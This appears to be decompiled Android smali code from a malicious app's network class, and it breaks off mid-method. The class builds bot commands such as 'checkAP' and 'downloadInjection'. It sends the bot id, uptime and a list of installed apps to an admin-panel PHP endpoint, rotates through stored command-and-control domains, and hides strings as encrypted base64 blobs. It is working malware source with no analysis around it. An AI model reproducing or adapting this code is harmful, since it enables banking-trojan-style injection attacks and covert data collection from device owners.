.class public final Lc0/b;
.super Ljava/lang/Object;
.source ""


# static fields
.field public static final a:Lc0/b;

.field public static final b:Ljava/lang/String;


# direct methods
.method public static constructor <clinit>()V
    .locals 1

    new-instance v0, Lc0/b;

    invoke-direct {v0}, Lc0/b;-><init>()V

    sput-object v0, Lc0/b;->a:Lc0/b;

    const-string v0, "apiUt"

    sput-object v0, Lc0/b;->b:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static synthetic f(Lc0/b;Ljava/lang/String;Ljava/lang/String;Ll0/d;I)Ljava/lang/Object;
    .locals 0

    const/4 p2, 0x0

    invoke-virtual {p0, p1, p2, p3}, Lc0/b;->e(Ljava/lang/String;Ljava/lang/String;Ll0/d;)Ljava/lang/Object;

    move-result-object p0

    return-object p0
.end method


# virtual methods
.method public final a(Landroid/content/Context;Ljava/lang/String;Ll0/d;)Ljava/lang/Object;
    .locals 7
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Ljava/lang/String;",
            "Ll0/d<",
            "-",
            "Ljava/lang/String;",
            ">;)",
            "Ljava/lang/Object;"
        }
    .end annotation

    instance-of v0, p3, Lc0/b$a;

    if-eqz v0, :cond_0

    move-object v0, p3

    check-cast v0, Lc0/b$a;

    iget v1, v0, Lc0/b$a;->h:I

    const/high16 v2, -0x80000000

    and-int v3, v1, v2

    if-eqz v3, :cond_0

    sub-int/2addr v1, v2

    iput v1, v0, Lc0/b$a;->h:I

    goto :goto_0

    :cond_0
    new-instance v0, Lc0/b$a;

    invoke-direct {v0, p0, p3}, Lc0/b$a;-><init>(Lc0/b;Ll0/d;)V

    :goto_0
    iget-object p3, v0, Lc0/b$a;->f:Ljava/lang/Object;

    sget-object v1, Lm0/a;->c:Lm0/a;

    iget v2, v0, Lc0/b$a;->h:I

    const-string v3, ""

    const/4 v4, 0x1

    if-eqz v2, :cond_2

    if-ne v2, v4, :cond_1

    :try_start_0
    invoke-static {p3}, Lb/a;->C(Ljava/lang/Object;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_1

    :catch_0
    move-exception p1

    goto/16 :goto_2

    :cond_1
    new-instance p1, Ljava/lang/IllegalStateException;

    const-string p2, "call to \'resume\' before \'invoke\' with coroutine"

    invoke-direct {p1, p2}, Ljava/lang/IllegalStateException;-><init>(Ljava/lang/String;)V

    throw p1

    :cond_2
    invoke-static {p3}, Lb/a;->C(Ljava/lang/Object;)V

    const-string p3, "c25UNkJOWnZMbWk2NHh5TnMyeXlLQjFnSWROekhnQzV2b2wrSDBlRTd6Y0NaRHZiMXVxRUZFZHl6SThuTUkvUDo6L09NWnp0M0tZZlJNemQrMndCK1pHZz09"

    invoke-static {p3}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 1
    sget-object p3, Lb0/b;->a:Lb0/b;

    .line 2
    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    const-string p3, "context.applicationContext"

    invoke-static {p1, p3}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 3
    sput-object p1, Ls0/c;->e:Landroid/content/Context;

    sget-object p3, Ls0/c;->d:Landroid/content/SharedPreferences;

    const/4 v2, 0x0

    if-nez p3, :cond_3

    const-string p3, "settings"

    invoke-virtual {p1, p3, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object p1

    sput-object p1, Ls0/c;->d:Landroid/content/SharedPreferences;

    .line 4
    :cond_3
    new-instance p1, Lorg/json/JSONObject;

    invoke-direct {p1}, Lorg/json/JSONObject;-><init>()V

    const-string p3, "command"

    const-string v5, "checkAP"

    invoke-virtual {p1, p3, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p3, "id"

    .line 5
    sget-object v5, Ls0/c;->d:Landroid/content/SharedPreferences;

    const-string v6, "R0xCWnhJZFNHREYzRysvUzh0UUV2Zz09OjpLRURZWk9Nb3Fqam9YU1BBTkxFTW93PT0="

    invoke-static {v5, v6, v3}, Landroidx/activity/result/a;->a(Landroid/content/SharedPreferences;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    if-nez v5, :cond_4

    move-object v5, v3

    .line 6
    :cond_4
    invoke-virtual {p1, p3, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p3, "ticks"

    .line 7
    sget-object v5, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v5}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v6, "timeWorking"

    invoke-interface {v5, v6, v2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v2

    .line 8
    invoke-static {v2}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p1, p3, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    :try_start_1
    invoke-virtual {p1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p1

    iput v4, v0, Lc0/b$a;->h:I

    invoke-virtual {p0, p1, p2, v0}, Lc0/b;->e(Ljava/lang/String;Ljava/lang/String;Ll0/d;)Ljava/lang/Object;

    move-result-object p3

    if-ne p3, v1, :cond_5

    return-object v1

    :cond_5
    :goto_1
    check-cast p3, Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    move-object v3, p3

    goto :goto_3

    :goto_2
    const-string p2, "TGNoYVNNbkRrY3JVMDFnenFzdmIzQT09OjpXOXdlRW5zcUQzb0dxbGZIS0lEdFRBPT0="

    invoke-static {p2}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/Exception;->getLocalizedMessage()Ljava/lang/String;

    .line 9
    sget-object p1, Lb0/b;->a:Lb0/b;

    :goto_3
    return-object v3
.end method

.method public final b(Landroid/content/Context;Ljava/lang/String;Ll0/d;)Ljava/lang/Object;
    .locals 6
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Ljava/lang/String;",
            "Ll0/d<",
            "-",
            "Ljava/lang/String;",
            ">;)",
            "Ljava/lang/Object;"
        }
    .end annotation

    instance-of v0, p3, Lc0/b$b;

    if-eqz v0, :cond_0

    move-object v0, p3

    check-cast v0, Lc0/b$b;

    iget v1, v0, Lc0/b$b;->h:I

    const/high16 v2, -0x80000000

    and-int v3, v1, v2

    if-eqz v3, :cond_0

    sub-int/2addr v1, v2

    iput v1, v0, Lc0/b$b;->h:I

    goto :goto_0

    :cond_0
    new-instance v0, Lc0/b$b;

    invoke-direct {v0, p0, p3}, Lc0/b$b;-><init>(Lc0/b;Ll0/d;)V

    :goto_0
    iget-object p3, v0, Lc0/b$b;->f:Ljava/lang/Object;

    sget-object v1, Lm0/a;->c:Lm0/a;

    iget v2, v0, Lc0/b$b;->h:I

    const-string v3, ""

    const/4 v4, 0x1

    if-eqz v2, :cond_2

    if-ne v2, v4, :cond_1

    :try_start_0
    invoke-static {p3}, Lb/a;->C(Ljava/lang/Object;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_1

    :cond_1
    new-instance p1, Ljava/lang/IllegalStateException;

    const-string p2, "call to \'resume\' before \'invoke\' with coroutine"

    invoke-direct {p1, p2}, Ljava/lang/IllegalStateException;-><init>(Ljava/lang/String;)V

    throw p1

    :cond_2
    invoke-static {p3}, Lb/a;->C(Ljava/lang/Object;)V

    new-instance p3, Lorg/json/JSONObject;

    invoke-direct {p3}, Lorg/json/JSONObject;-><init>()V

    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    const-string v2, "context.applicationContext"

    invoke-static {p1, v2}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 1
    sput-object p1, Ls0/c;->e:Landroid/content/Context;

    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v2, :cond_3

    const-string v2, "settings"

    const/4 v5, 0x0

    invoke-virtual {p1, v2, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object p1

    sput-object p1, Ls0/c;->d:Landroid/content/SharedPreferences;

    .line 2
    :cond_3
    :try_start_1
    const-string p1, "command"

    const-string v2, "downloadInjection"

    invoke-virtual {p3, p1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p1, "id"

    .line 3
    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v2}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v5, "idbot"

    invoke-interface {v2, v5, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    if-nez v2, :cond_4

    move-object v2, v3

    .line 4
    :cond_4
    invoke-virtual {p3, p1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p1, "inject"

    invoke-virtual {p3, p1, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {p3}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p1

    iput v4, v0, Lc0/b$b;->h:I

    const/4 p2, 0x0

    .line 5
    invoke-virtual {p0, p1, p2, v0}, Lc0/b;->e(Ljava/lang/String;Ljava/lang/String;Ll0/d;)Ljava/lang/Object;

    move-result-object p3
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    if-ne p3, v1, :cond_5

    return-object v1

    :cond_5
    :goto_1
    return-object p3

    :catchall_0
    move-exception p1

    .line 6
    invoke-static {p1}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    return-object v3
.end method

.method public final c(Landroid/content/Context;Ll0/d;)Ljava/lang/Object;
    .locals 4
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Ll0/d<",
            "-",
            "Ljava/lang/String;",
            ">;)",
            "Ljava/lang/Object;"
        }
    .end annotation

    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "context.applicationContext"

    invoke-static {v0, v1}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 1
    sput-object v0, Ls0/c;->e:Landroid/content/Context;

    sget-object v1, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v1, :cond_0

    const-string v1, "settings"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    sput-object v0, Ls0/c;->d:Landroid/content/SharedPreferences;

    .line 2
    :cond_0
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    const-string v1, "command"

    const-string v2, "downloadingInjections"

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "UzJTWks4OFpZQnRhRzZDekZDYlg4azFEZUwwYUVTNlI1RFh6NWFoWlVPQT06Om5JdERWU0NZU043Q2V5T2REMHhZelE9PQ=="

    invoke-static {v1}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 3
    sget-object v1, Lb0/b;->a:Lb0/b;

    .line 4
    sget-object v1, Ls0/c;->d:Landroid/content/SharedPreferences;

    const-string v2, "R0xCWnhJZFNHREYzRysvUzh0UUV2Zz09OjpLRURZWk9Nb3Fqam9YU1BBTkxFTW93PT0="

    const-string v3, ""

    invoke-static {v1, v2, v3}, Landroidx/activity/result/a;->a(Landroid/content/SharedPreferences;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    if-nez v1, :cond_1

    goto :goto_0

    :cond_1
    move-object v3, v1

    .line 5
    :goto_0
    :try_start_0
    const-string v1, "id"

    invoke-virtual {v0, v1, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "apps"

    sget-object v2, Lh0/a;->a:Lh0/a;

    invoke-virtual {v2, p1}, Lh0/a;->f(Landroid/content/Context;)Lorg/json/JSONArray;

    move-result-object p1

    invoke-virtual {v0, v1, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_1

    :catchall_0
    move-exception p1

    invoke-static {p1}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :goto_1
    const-string p1, "jsonUpdateInj: "

    invoke-static {p1, v0}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    .line 6
    sget-object p1, Lb0/b;->a:Lb0/b;

    .line 7
    invoke-virtual {v0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p1

    const/4 v0, 0x0

    .line 8
    invoke-virtual {p0, p1, v0, p2}, Lc0/b;->e(Ljava/lang/String;Ljava/lang/String;Ll0/d;)Ljava/lang/Object;

    move-result-object p1

    return-object p1
.end method

.method public final d(Landroid/content/Context;Ll0/d;)Ljava/lang/Object;
    .locals 11
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Ll0/d<",
            "-",
            "Lj0/g;",
            ">;)",
            "Ljava/lang/Object;"
        }
    .end annotation

    const-string v0, ""

    instance-of v1, p2, Lc0/b$c;

    if-eqz v1, :cond_0

    move-object v1, p2

    check-cast v1, Lc0/b$c;

    iget v2, v1, Lc0/b$c;->n:I

    const/high16 v3, -0x80000000

    and-int v4, v2, v3

    if-eqz v4, :cond_0

    sub-int/2addr v2, v3

    iput v2, v1, Lc0/b$c;->n:I

    goto :goto_0

    :cond_0
    new-instance v1, Lc0/b$c;

    invoke-direct {v1, p0, p2}, Lc0/b$c;-><init>(Lc0/b;Ll0/d;)V

    :goto_0
    iget-object p2, v1, Lc0/b$c;->l:Ljava/lang/Object;

    sget-object v2, Lm0/a;->c:Lm0/a;

    iget v3, v1, Lc0/b$c;->n:I

    const/4 v4, 0x1

    const/4 v5, 0x0

    if-eqz v3, :cond_2

    if-ne v3, v4, :cond_1

    iget p1, v1, Lc0/b$c;->k:I

    iget v0, v1, Lc0/b$c;->j:I

    iget-object v3, v1, Lc0/b$c;->i:Ljava/lang/Object;

    check-cast v3, Ljava/lang/String;

    iget-object v6, v1, Lc0/b$c;->h:Ljava/lang/Object;

    check-cast v6, [Ljava/lang/String;

    iget-object v7, v1, Lc0/b$c;->g:Ljava/lang/Object;

    check-cast v7, Lc0/b;

    iget-object v8, v1, Lc0/b$c;->f:Ljava/lang/Object;

    check-cast v8, Landroid/content/Context;

    :try_start_0
    invoke-static {p2}, Lb/a;->C(Ljava/lang/Object;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto/16 :goto_2

    :catchall_0
    move-exception p1

    goto/16 :goto_5

    :cond_1
    new-instance p1, Ljava/lang/IllegalStateException;

    const-string p2, "call to \'resume\' before \'invoke\' with coroutine"

    invoke-direct {p1, p2}, Ljava/lang/IllegalStateException;-><init>(Ljava/lang/String;)V

    throw p1

    :cond_2
    invoke-static {p2}, Lb/a;->C(Ljava/lang/Object;)V

    .line 1
    :try_start_1
    sget-object p2, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {p2}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v3, "urls"

    invoke-interface {p2, v3, v0}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    if-nez p2, :cond_3

    move-object p2, v0

    .line 2
    :cond_3
    const-string v3, ";"

    const/4 v6, 0x2

    invoke-static {p2, v3, v5, v6}, Ly0/h;->R(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZI)Z

    move-result v3

    if-eqz v3, :cond_9

    const-string v3, " "

    const/4 v6, 0x4

    invoke-static {p2, v3, v0, v5, v6}, Ly0/f;->O(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;ZI)Ljava/lang/String;

    move-result-object p2

    new-array v0, v4, [Ljava/lang/String;

    const-string v3, ";"

    aput-object v3, v0, v5

    const/4 v3, 0x6

    invoke-static {p2, v0, v5, v5, v3}, Ly0/h;->a0(Ljava/lang/CharSequence;[Ljava/lang/String;ZII)Ljava/util/List;

    move-result-object p2

    new-array v0, v5, [Ljava/lang/String;

    invoke-interface {p2, v0}, Ljava/util/Collection;->toArray([Ljava/lang/Object;)[Ljava/lang/Object;

    move-result-object p2

    if-eqz p2, :cond_8

    check-cast p2, [Ljava/lang/String;

    array-length v0, p2

    move-object v7, p0

    move-object v6, p2

    move-object p2, p1

    move p1, v0

    move v0, v5

    :cond_4
    :goto_1
    if-ge v0, p1, :cond_9

    aget-object v3, v6, v0

    add-int/lit8 v0, v0, 0x1

    invoke-virtual {v3}, Ljava/lang/String;->length()I

    move-result v8

    const/4 v9, 0x5

    if-le v8, v9, :cond_4

    invoke-static {v7}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    const-string v8, "Check URL: "

    invoke-static {v8, v3}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    .line 3
    sget-object v8, Lb0/b;->a:Lb0/b;

    .line 4
    iput-object p2, v1, Lc0/b$c;->f:Ljava/lang/Object;

    iput-object v7, v1, Lc0/b$c;->g:Ljava/lang/Object;

    iput-object v6, v1, Lc0/b$c;->h:Ljava/lang/Object;

    iput-object v3, v1, Lc0/b$c;->i:Ljava/lang/Object;

    iput v0, v1, Lc0/b$c;->j:I

    iput p1, v1, Lc0/b$c;->k:I

    iput v4, v1, Lc0/b$c;->n:I

    invoke-virtual {v7, p2, v3, v1}, Lc0/b;->a(Landroid/content/Context;Ljava/lang/String;Ll0/d;)Ljava/lang/Object;

    move-result-object v8

    if-ne v8, v2, :cond_5

    return-object v2

    :cond_5
    move-object v10, v8

    move-object v8, p2

    move-object p2, v10

    :goto_2
    check-cast p2, Ljava/lang/CharSequence;

    invoke-interface {p2}, Ljava/lang/CharSequence;->length()I

    move-result p2

    if-lez p2, :cond_6

    move p2, v4

    goto :goto_3

    :cond_6
    move p2, v5

    :goto_3
    if-eqz p2, :cond_7

    const-string p1, "value"

    .line 5
    invoke-static {v3, p1}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object p1, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {p1}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {p1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p1

    const-string p2, "urlAdminPanel"

    invoke-interface {p1, p2, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {p1}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 6
    invoke-static {v7}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    const-string p1, "NEW DOMAIN: "

    invoke-static {p1, v3}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    .line 7
    sget-object p1, Lb0/b;->a:Lb0/b;

    goto :goto_4

    :cond_7
    move-object p2, v8

    goto :goto_1

    .line 8
    :cond_8
    new-instance p1, Ljava/lang/NullPointerException;

    const-string p2, "null cannot be cast to non-null type kotlin.Array<T>"

    invoke-direct {p1, p2}, Ljava/lang/NullPointerException;-><init>(Ljava/lang/String;)V

    throw p1

    :cond_9
    :goto_4
    sget-object p1, Lj0/g;->a:Lj0/g;
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    goto :goto_6

    :goto_5
    invoke-static {p1}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    move-result-object p1

    :goto_6
    invoke-static {p1}, Lj0/d;->a(Ljava/lang/Object;)Ljava/lang/Throwable;

    move-result-object p1

    if-eqz p1, :cond_a

    const-string p1, "a003KzY4ZHdrTG9kN3JsUXNDV1NCTnl0SjA5UldJUnpUUU5wZk0rcnZOYz06OlJlV2ZobXl5M3U3d2xvbmx2SXJmcGc9PQ=="

    invoke-static {p1}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 9
    sget-object p1, Lb0/b;->a:Lb0/b;

    .line 10
    :cond_a
    sget-object p1, Lj0/g;->a:Lj0/g;

    return-object p1
.end method

.method public final e(Ljava/lang/String;Ljava/lang/String;Ll0/d;)Ljava/lang/Object;
    .locals 6
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/String;",
            "Ljava/lang/String;",
            "Ll0/d<",
            "-",
            "Ljava/lang/String;",
            ">;)",
            "Ljava/lang/Object;"
        }
    .end annotation

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    if-nez p2, :cond_0

    .line 1
    sget-object p2, Ls0/c;->d:Landroid/content/SharedPreferences;

    const-string v1, "aWFWdHEwYWJtekNxM0pQYzlIaFNQUT09Ojp5ZmczbytBMTNmaFhQcUtxYVF1Qkt3PT0="

    const-string v2, ""

    invoke-static {p2, v1, v2}, Landroidx/activity/result/a;->a(Landroid/content/SharedPreferences;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    if-nez p2, :cond_0

    move-object p2, v2

    .line 2
    :cond_0
    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p2, "/"

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    new-instance p2, Ljava/util/Random;

    invoke-direct {p2}, Ljava/util/Random;-><init>()V

    const/16 v1, 0x14

    invoke-virtual {p2, v1}, Ljava/util/Random;->nextInt(I)I

    move-result p2

    add-int/lit8 p2, p2, 0x1

    .line 3
    const-string v1, "qwertyuiopasdfghjklzxcvbnm1234567890"

    new-instance v2, Ljava/util/Random;

    invoke-direct {v2}, Ljava/util/Random;-><init>()V

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    if-lez p2, :cond_2

    const/4 v4, 0x0

    :cond_1
    add-int/lit8 v4, v4, 0x1

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v5

    invoke-virtual {v2, v5}, Ljava/util/Random;->nextInt(I)I

    move-result v5

    invoke-virtual {v1, v5}, Ljava/lang/String;->charAt(I)C

    move-result v5

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    if-lt v4, p2, :cond_1

    :cond_2
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    const-string v1, "buf.toString()"

    invoke-static {p2, v1}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 4
    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p2, ".php/"

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    const-string v0, "endUenRlRXExd1FyNXFFbi9CSDhtZz09OjpNbTgvblJQNXVHdGMvQ0pxaFBHd1NBPT0="

    invoke-static {v0}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 5
    sget-object v0, Lb0/b;->a:Lb0/b;

    .line 6
    sget-object v0, Lc0/c;->a:Lc0/c;

    invoke-virtual {v0, p2, p1, p3}, Lc0/c;->b(Ljava/lang/String;Ljava/lang/String;Ll0/d;)Ljava/lang/Object;

    move-result-object p1

    return-object p1
.end method

.method public final g(Landroid/content/Context;Ll0/d;)Ljava/lang/Object;
    .locals 9
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Ll0/d<",
            "-",
            "Lj0/g;",
            ">;)",
            "Ljava/lang/Object;"
        }
    .end annotation

    instance-of v0, p2, Lc0/b$d;

    if-eqz v0, :cond_0

    move-object v0, p2

    check-cast v0, Lc0/b$d;

    iget v1, v0, Lc0/b$d;->j:I

    const/high16 v2, -0x80000000

    and-int v3, v1, v2

    if-eqz v3, :cond_0

    sub-int/2addr v1, v2

    iput v1, v0, Lc0/b$d;->j:I

    goto :goto_0

    :cond_0
    new-instance v0, Lc0/b$d;

    invoke-direct {v0, p0, p2}, Lc0/b$d;-><init>(Lc0/b;Ll0/d;)V

    :goto_0
    iget-object p2, v0, Lc0/b$d;->h:Ljava/lang/Object;

    sget-object v1, Lm0/a;->c:Lm0/a;

    iget v2, v0, Lc0/b$d;->j:I

    const/4 v3, 0x4

    const/4 v4, 0x3

    const/4 v5, 0x2

    const/4 v6, 0x1

    const/4 v7, 0x0

    if-eqz v2, :cond_5

    if-eq v2, v6, :cond_4

    if-eq v2, v5, :cond_3

    if-eq v2, v4, :cond_2

    if-ne v2, v3, :cond_1

    invoke-static {p2}, Lb/a;->C(Ljava/lang/Object;)V

    goto/16 :goto_4

    :cond_1
    new-instance p1, Ljava/lang/IllegalStateException;

    const-string p2, "call to \'resume\' before \'invoke\' with coroutine"

    invoke-direct {p1, p2}, Ljava/lang/IllegalStateException;-><init>(Ljava/lang/String;)V

    throw p1

    :cond_2
    invoke-static {p2}, Lb/a;->C(Ljava/lang/Object;)V

    goto/16 :goto_3

    :cond_3
    invoke-static {p2}, Lb/a;->C(Ljava/lang/Object;)V

    goto :goto_2

    :cond_4
    iget-object p1, v0, Lc0/b$d;->g:Ljava/lang/Object;

    check-cast p1, Landroid/content/Context;

    iget-object v2, v0, Lc0/b$d;->f:Ljava/lang/Object;

    check-cast v2, Lc0/b;

    invoke-static {p2}, Lb/a;->C(Ljava/lang/Object;)V

    goto :goto_1

    :cond_5
    invoke-static {p2}, Lb/a;->C(Ljava/lang/Object;)V

    const-string p2, "NklMVG81RFJvS002ZFZrQ3hvUXE0bGFtYWFIeW9yWDRtdWx2RWYzYSsxQUlNbWt3QVdmOWFNaXVBOWtRYzhjOWZyTzFHNXFxZ3RjcXpHNGlBT09SVVE9PTo6dGJyY2JMS1A4eS83K3M2VXV1MWs5QT09"

    invoke-static {p2}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 1
    sget-object p2, Lb0/b;->a:Lb0/b;

    .line 2
    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p2

    const-string v2, "context.applicationContext"

    invoke-static {p2, v2}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 3
    sput-object p2, Ls0/c;->e:Landroid/content/Context;

    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v2, :cond_6

    const-string v2, "settings"

    const/4 v8, 0x0

    invoke-virtual {p2, v2, v8}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object p2

    sput-object p2, Ls0/c;->d:Landroid/content/SharedPreferences;

    .line 4
    :cond_6
    iput-object p0, v0, Lc0/b$d;->f:Ljava/lang/Object;

    iput-object p1, v0, Lc0/b$d;->g:Ljava/lang/Object;

    iput v6, v0, Lc0/b$d;->j:I

    invoke-virtual {p0, p1, v7, v0}, Lc0/b;->a(Landroid/content/Context;Ljava/lang/String;Ll0/d;)Ljava/lang/Object;

    move-result-object p2

    if-ne p2, v1, :cond_7

    return-object v1

    :cond_7
    move-object v2, p0

    :goto_1
    check-cast p2, Ljava/lang/String;

    const-string v6, ""

    invoke-static {p2, v6}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_9

    iput-object v7, v0, Lc0/b$d;->f:Ljava/lang/Object;

    iput-object v7, v0, Lc0/b$d;->g:Ljava/lang/Object;

    iput v5, v0, Lc0/b$d;->j:I

    invoke-virtual {v2, p1, v0}, Lc0/b;->d(Landroid/content/Context;Ll0/d;)Ljava/lang/Object;

    move-result-object p1

    if-ne p1, v1, :cond_8

    return-object v1

    :cond_8
    :goto_2
    sget-object p1, Lj0/g;->a:Lj0/g;

    return-object p1

    :cond_9
    const-string v5, "~no~"

    invoke-static {p2, v5}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_b

    iput-object v7, v0, Lc0/b$d;->f:Ljava/lang/Object;

    iput-object v7, v0, Lc0/b$d;->g:Ljava/lang/Object;

    iput v4, v0, Lc0/b$d;->j:I

    invoke-virtual {v2, p1, p2, v0}, Lc0/b;->i(Landroid/content/Context;Ljava/lang/String;Ll0/d;)Ljava/lang/Object;

    move-result-object p1

    if-ne p1, v1, :cond_a

    return-object v1

    :cond_a
    :goto_3
    sget-object p1, Lj0/g;->a:Lj0/g;

    return-object p1

    :cond_b
    new-instance v2, Lorg/json/JSONObject;

